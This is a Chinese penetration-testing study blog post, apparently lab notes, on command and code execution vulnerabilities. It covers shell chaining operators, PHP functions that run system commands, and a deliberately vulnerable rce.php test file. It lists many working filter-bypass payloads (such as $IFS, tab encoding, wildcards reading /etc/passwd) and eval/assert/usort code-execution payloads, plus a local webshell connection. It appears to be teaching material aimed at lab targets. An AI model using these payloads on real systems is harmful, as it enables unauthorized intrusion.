{"title":"渗透测试笔记 - day31、32、33 RCE","date":"2022-03-10T00:00:00.000Z","date_formatted":{"ll":"Mar 10, 2022","L":"03/10/2022","MM-DD":"03-10"},"link":"2022/03/10/渗透测试笔记 - day31、32、33 RCE","updated":"2023-03-17T12:07:41.490Z","content":"<h2 id=\"windows命令连接符\">Windows命令连接符<a title=\"#windows命令连接符\" href=\"#windows命令连接符\"></a></h2>\n<ul>\n<li>&quot;&amp;&quot;拼接。所有命令都执行（错误命令报错，正确命令执行）。</li>\n</ul>\n<p>可以拼接多个命令。如ipconfig &amp; net user &amp; hostname</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112146827.png\" alt=\"image-20220311190955798\" loading=\"lazy\" class=\"φbp\"></p>\n<ul>\n<li>&quot;&amp;&amp;&quot;拼接。从左到右执行，直至遇到错误命令终止。</li>\n</ul>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112146626.png\" alt=\"image-20220311191502240\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112146983.png\" alt=\"image-20220311191513603\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112147199.png\" alt=\"image-20220311191837906\" loading=\"lazy\" class=\"φbp\"></p>\n<ul>\n<li>&quot;|&quot;拼接。只执行最后一个命令；有一个命令出错，直接报错，所有的都不执行。</li>\n</ul>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112147623.png\" alt=\"image-20220311191756918\" loading=\"lazy\" class=\"φbp\"></p>\n<ul>\n<li>&quot;||&quot;执行第一个正确的命令。其他不执行。</li>\n</ul>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112147258.png\" alt=\"image-20220311191948801\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112147543.png\" alt=\"image-20220311192009846\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"命令执行漏洞\">命令执行漏洞<a title=\"#命令执行漏洞\" href=\"#命令执行漏洞\"></a></h2>\n<p>使用场景。如：交换机测试各个系统的网络连通性，需要调用ping命令。</p>\n<h3 id=\"漏洞成因。\">漏洞成因。<a title=\"#漏洞成因。\" href=\"#漏洞成因。\"></a></h3>\n<ul>\n<li>网站具备命令执行功能</li>\n<li>需要执行的命令从外部接受</li>\n<li>接受的命令未做过滤</li>\n</ul>\n<h3 id=\"修复建议\">修复建议<a title=\"#修复建议\" href=\"#修复建议\"></a></h3>\n<ul>\n<li>过滤掉‘&amp;’、‘&amp;&amp;’、‘|’、‘||’等连接符</li>\n<li>对需要接受的命令做白名单限制</li>\n</ul>\n<h3 id=\"php环境下的系统命令执行\">PHP环境下的系统命令执行<a title=\"#php环境下的系统命令执行\" href=\"#php环境下的系统命令执行\"></a></h3>\n<ul>\n<li>shell_exec()</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">shell_exec</span>(<span class=\"string\">&#x27;hostname | net user&#x27;</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112147451.png\" alt=\"image-20220311204947297\" loading=\"lazy\" class=\"φbp\"></p>\n<ul>\n<li>exec()</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"title function_ invoke__\">exec</span>(<span class=\"string\">&#x27;hostname&#x27;</span>,<span class=\"variable\">$a</span>); <span class=\"comment\">//$a接受系统命令返回结果</span></span><br><span class=\"line\">\t<span class=\"title function_ invoke__\">print_r</span>(<span class=\"variable\">$a</span>);\t<span class=\"comment\">//以更容易理解的形式打印变量</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112147593.png\" alt=\"image-20220311205038889\" loading=\"lazy\" class=\"φbp\"></p>\n<ul>\n<li>system()</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> <span class=\"title function_ invoke__\">system</span>(<span class=\"string\">&#x27;hostname&#x27;</span>);<span class=\"meta\">?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?</span><span class=\"title function_ invoke__\">system</span>(<span class=\"string\">&#x27;hostname&#x27;</span>);\t<span class=\"comment\">//可以省略部分标签,只有5.2.17和5.3.29-nts版本支持</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112147555.png\" alt=\"image-20220311205119068\" loading=\"lazy\" class=\"φbp\"></p>\n<ul>\n<li>passthru()</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">\t<span class=\"title function_ invoke__\">passthru</span>(<span class=\"string\">&#x27;ipconfig&#x27;</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112147363.png\" alt=\"image-20220311205159074\" loading=\"lazy\" class=\"φbp\"></p>\n<ul>\n<li>proc_open()</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">龙哥又双叒叕翻车了。</span><br></pre></td></tr></table></figure>\n<ul>\n<li>反引号</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> `ipconfig`;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112147252.png\" alt=\"image-20220311205230691\" loading=\"lazy\" class=\"φbp\"></p>\n<h1 id=\"hvv-day32-linux下的rce（2）\">hvv-day32 Linux下的RCE（2）<a title=\"#hvv-day32-linux下的rce（2）\" href=\"#hvv-day32-linux下的rce（2）\"></a></h1>\n<h2 id=\"linux命令连接符\">Linux命令连接符<a title=\"#linux命令连接符\" href=\"#linux命令连接符\"></a></h2>\n<ul>\n<li>“;” 连接符。使多个命令顺序执行</li>\n</ul>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112147691.png\" alt=\"image-20220314192419042\" loading=\"lazy\" class=\"φbp\"></p>\n<ul>\n<li>&quot;&amp;&quot;连接符。使命令在后台执行</li>\n</ul>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112147056.png\" alt=\"image-20220314192637649\" loading=\"lazy\" class=\"φbp\"></p>\n<ul>\n<li>&quot;&amp;&amp;&quot;连接符。第一个命令成功执行，继续执行第二个。</li>\n</ul>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112147344.png\" alt=\"image-20220314192651853\" loading=\"lazy\" class=\"φbp\"></p>\n<ul>\n<li>&quot;|&quot;连接符。将第一个命令的输出作为第二个命令的输入。</li>\n</ul>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112147825.png\" alt=\"image-20220314192700024\" loading=\"lazy\" class=\"φbp\"></p>\n<ul>\n<li>&quot;||&quot;连接符。前面的命令执行成功则后面的命令不会执行，前面的命令执行失败后面的命令会执行。</li>\n</ul>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112147083.png\" alt=\"image-20220314192901397\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"命令执行绕过\">命令执行绕过<a title=\"#命令执行绕过\" href=\"#命令执行绕过\"></a></h2>\n<p>实验环境：</p>\n<p>​\tCentOS7；(关闭防火墙)<br>\n​\t\t\tLAMP；<br>\n​\t\t\t/var/www/rce.php(<?php system($_GET[cmd]);show_source(__FILE__)?>)</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112147783.png\" alt=\"image-20220314194338864\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112147559.png\" alt=\"image-20220314194540703\" loading=\"lazy\" class=\"φbp\"></p>\n<h3 id=\"无绕过命令执行\">无绕过命令执行<a title=\"#无绕过命令执行\" href=\"#无绕过命令执行\"></a></h3>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112147962.png\" alt=\"image-20220314194642797\" loading=\"lazy\" class=\"φbp\"></p>\n<h3 id=\"特殊环境变量绕过\">特殊环境变量绕过<a title=\"#特殊环境变量绕过\" href=\"#特殊环境变量绕过\"></a></h3>\n<p>$IFS是shell的特殊环境变量,是Linux下的内部区域分隔符。$IFS中存储的值可以是空格、制表符、换行符或者其他自定义符号。</p>\n<p>payload：rce.php?cmd=echo${IFS}123</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112147030.png\" alt=\"image-20220314195202234\" loading=\"lazy\" class=\"φbp\"></p>\n<h3 id=\"制表符绕过\">制表符绕过<a title=\"#制表符绕过\" href=\"#制表符绕过\"></a></h3>\n<p>%09是制表符的URL编码。可以通过%09来代替空格。</p>\n<p>payload：rce.php?cmd=echo%09123</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112147447.png\" alt=\"image-20220314195343772\" loading=\"lazy\" class=\"φbp\"></p>\n<h3 id=\"大括号绕过\">大括号绕过<a title=\"#大括号绕过\" href=\"#大括号绕过\"></a></h3>\n<p>payload：rce.php?cmd={echo,123}</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112147571.png\" alt=\"image-20220314195356487\" loading=\"lazy\" class=\"φbp\"></p>\n<h3 id=\"变量拼接绕过\">变量拼接绕过<a title=\"#变量拼接绕过\" href=\"#变量拼接绕过\"></a></h3>\n<p>payload：rce.php?cmd=a=i;b=d;$a$b</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112147328.png\" alt=\"image-20220314195516264\" loading=\"lazy\" class=\"φbp\"></p>\n<h3 id=\"空变量绕过\">空变量绕过<a title=\"#空变量绕过\" href=\"#空变量绕过\"></a></h3>\n<p>payload：rce.php?cmd=i${2}d</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112147641.png\" alt=\"image-20220314195708416\" loading=\"lazy\" class=\"φbp\"></p>\n<h3 id=\"重定向绕过\">重定向绕过<a title=\"#重定向绕过\" href=\"#重定向绕过\"></a></h3>\n<p>payload：rce.php?cmd=cat&lt;rce.php</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112147100.png\" alt=\"image-20220314221113659\" loading=\"lazy\" class=\"φbp\"></p>\n<h3 id=\"系统变量绕过\">系统变量绕过<a title=\"#系统变量绕过\" href=\"#系统变量绕过\"></a></h3>\n<p>可以通过<code>echo $&#123;SHELLOPTS&#125;</code>来查看其内容，<code>:3:1</code>为截取其其中一个字符串。</p>\n<p>payload：rce.php?cmd=${SHELLOPTS:3:1}at rce.php</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112147865.png\" alt=\"image-20220314221031831\" loading=\"lazy\" class=\"φbp\"></p>\n<h3 id=\"反斜杠绕过\">反斜杠绕过<a title=\"#反斜杠绕过\" href=\"#反斜杠绕过\"></a></h3>\n<p>payload：rce.php?cmd=\\c\\a\\t\\ \\r\\c\\e.\\p\\h\\p</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112147275.png\" alt=\"image-20220314221135576\" loading=\"lazy\" class=\"φbp\"></p>\n<h3 id=\"通配符绕过\">通配符绕过<a title=\"#通配符绕过\" href=\"#通配符绕过\"></a></h3>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112147709.png\" alt=\"image-20220314201037145\" loading=\"lazy\" class=\"φbp\"></p>\n<p>payload：rce.php?cmd=cat /etc/****wd</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112147126.png\" alt=\"image-20220314221237284\" loading=\"lazy\" class=\"φbp\"></p>\n<p>payload：rce.php?cmd=cat /e??/???wd</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112147190.png\" alt=\"image-20220314221310288\" loading=\"lazy\" class=\"φbp\"></p>\n<p>payload：rce.php?cmd=cat /e[qwert]?/???wd</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112147956.png\" alt=\"image-20220314221330336\" loading=\"lazy\" class=\"φbp\"></p>\n<h1 id=\"hvv-day33-php中的rce\">hvv-day33 PHP中的RCE<a title=\"#hvv-day33-php中的rce\" href=\"#hvv-day33-php中的rce\"></a></h1>\n<h2 id=\"eval()\">eval()<a title=\"#eval()\" href=\"#eval()\"></a></h2>\n<p>用于执行PHP命令。命令以分号结尾。</p>\n<p>例：</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112147795.png\" alt=\"image-20220315205424251\" loading=\"lazy\" class=\"φbp\"></p>\n<p><strong>Pikachu靶场RCE-漏洞练习</strong></p>\n<p>payload：phpinfo();</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112147842.png\" alt=\"image-20220315205634140\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112147615.png\" alt=\"image-20220315205643070\" loading=\"lazy\" class=\"φbp\"></p>\n<p>使用system执行系统命令</p>\n<p>payload：system(“whoami”);</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112147001.png\" alt=\"image-20220315205753528\" loading=\"lazy\" class=\"φbp\"></p>\n<p>完成。</p>\n<h2 id=\"assert()\">assert()<a title=\"#assert()\" href=\"#assert()\"></a></h2>\n<p>同eval()。但命令结尾无需分号。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112148142.png\" alt=\"image-20220315211033396\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"preg_function()\">preg_function()<a title=\"#preg_function()\" href=\"#preg_function()\"></a></h2>\n<p>用法：preg_replace(‘正则规则’,‘替换字符’,‘目标字符’)</p>\n<p>当正则规则使用‘/e’，则存在代码执行漏洞。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112148249.png\" alt=\"image-20220315212406504\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"create_function()\">create_function()<a title=\"#create_function()\" href=\"#create_function()\"></a></h2>\n<p>创建匿名函数。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112148214.png\" alt=\"image-20220315212843683\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"array_map()\">array_map()<a title=\"#array_map()\" href=\"#array_map()\"></a></h2>\n<p>将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112148103.png\" alt=\"image-20220315214016158\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"call_user_function()\">call_user_function()<a title=\"#call_user_function()\" href=\"#call_user_function()\"></a></h2>\n<p>把第一个参数作为回调函数调用，其余参数作为回调函数的参数。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112148188.png\" alt=\"image-20220315214941683\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"call_user_func_array()\">call_user_func_array()<a title=\"#call_user_func_array()\" href=\"#call_user_func_array()\"></a></h2>\n<p>调用回调函数，并把一个数组的作为回调函数有的参数。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112148402.png\" alt=\"image-20220315215357055\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"array_filter()\">array_filter()<a title=\"#array_filter()\" href=\"#array_filter()\"></a></h2>\n<p>用法：array_filter($array,$func)</p>\n<p>将数组中的每个值传递到func函数中，如果func函数返回true，则数组的当前值会被包含在返回的结果数组中。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112148408.png\" alt=\"image-20220315220315942\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"usort()\">usort()<a title=\"#usort()\" href=\"#usort()\"></a></h2>\n<p>php version &gt;= 5.6。（phpstudy2016中需要php版本为5.6.27）</p>\n<p>通过用户自定义的比较函数对数组进行排序。</p>\n<p>payload：?1[]=1-1&amp;1[]=eval($_POST[‘x’])&amp;2=assert</p>\n<p>同时post数据：x=system(hostname);</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112148721.png\" alt=\"image-20220315231523824\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"uasort()\">uasort()<a title=\"#uasort()\" href=\"#uasort()\"></a></h2>\n<p>php version（在phpstudy中只有5.4.45、5.5.38、5.6.27）</p>\n<p>使用用户自定义的比较函数对数组中的值进行排序并保持索引关联。</p>\n<p>payload：?1=1+1&amp;2=eval($_POST[x])<br>\n同时post x=system(hostname);</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112148053.png\" alt=\"image-20220315231646263\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"拼接绕过\">拼接绕过<a title=\"#拼接绕过\" href=\"#拼接绕过\"></a></h2>\n<p>用get拼接命令和参数。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112148301.png\" alt=\"image-20220315232002240\" loading=\"lazy\" class=\"φbp\"></p>\n<p>webshell连接：</p>\n<p>url：<a href=\"http://127.0.0.1:7790/rce/index.php?a=assert\" target=\"_blank\">http://127.0.0.1:7790/rce/index.php?a=assert</a></p>\n<p>密码：b</p>\n","prev":{"title":"渗透测试笔记 - day34 CSRF","link":"2022/03/17/渗透测试笔记 - day34 CSRF"},"next":{"title":"渗透测试笔记 - day28、29、30 文件包含","link":"2022/03/03/渗透测试笔记 - day28、29、30 文件包含"},"plink":"https://Lq0ne.github.io/2022/03/10/渗透测试笔记 - day31、32、33 RCE/","toc":[{"id":"windows命令连接符","title":"Windows命令连接符","index":"1"},{"id":"命令执行漏洞","title":"命令执行漏洞","index":"2","children":[{"id":"漏洞成因。","title":"漏洞成因。","index":"2.1"},{"id":"修复建议","title":"修复建议","index":"2.2"},{"id":"php环境下的系统命令执行","title":"PHP环境下的系统命令执行","index":"2.3"}]}],"copyright":{"license":"个人原创 - 自由转载 - 保持署名 - 禁止商用","published":"March 10, 2022","author":"Lq0ne","link":"<a href=\"https://Lq0ne.github.io/2022/03/10/渗透测试笔记 - day31、32、33 RCE/\" title=\"渗透测试笔记 - day31、32、33 RCE\">https://Lq0ne.github.io/2022/03/10/渗透测试笔记 - day31、32、33 RCE/</a>"},"reading_time":"1571 words in 10 min"}